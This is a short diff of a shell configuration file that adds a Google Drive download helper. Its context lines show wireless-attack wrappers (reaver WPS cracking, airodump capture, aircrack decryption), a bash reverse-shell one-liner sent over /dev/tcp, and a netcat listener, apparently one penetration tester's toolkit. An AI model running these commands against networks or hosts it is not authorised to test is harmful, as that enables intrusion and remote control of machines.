@@ -39,6 +39,13 @@ function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w 
 function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
 function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }
 
+# gdrive
+function gdrive () {
+  CONFIRM=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate "https://docs.google.com/uc?export=download&id=$1" -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')
+  wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$CONFIRM&id=$1" -O $2
+  rm -rf /tmp/cookies.txt
+}
+
 # shell
 function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
 function shell-listen() { sudo nc -nvlp "$1"; }
